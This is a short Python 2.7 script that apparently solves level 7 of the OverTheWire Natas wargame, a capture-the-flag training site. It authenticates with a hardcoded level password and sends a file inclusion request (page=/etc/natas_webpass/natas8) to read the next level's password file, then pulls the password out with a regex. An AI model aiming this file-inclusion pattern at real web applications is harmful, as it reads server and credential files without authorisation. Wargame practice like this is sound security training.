#python2.7
import requests
import re
username = 'natas7'
password = '7z3hEENjQtflzgnT29q7wAvMNfZdh0i9'
url = 'http://%s.natas.labs.overthewire.org/index.php' % username
#http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8
#headers = {'Authorization': 'access_token myToken' }

#response = requests.get(url,  headers = headers,auth = (username, password))

s = requests.Session()
#s.auth = (username, password)
s.headers.update({'x-test': 'true'})

#send own cookie
cookies = {"loggedin" : "1"}

#r = s.get(url, auth = (username, password), cookies = cookies,)
r = s.post(url, params = {'page':'/etc/natas_webpass/natas8'},  auth = (username, password) )
#print r.text
#print 'print cookie:'
#print s.cookies['loggedin']
content = r.text
print content
print re.findall('natas8 is (.*)', content)[0]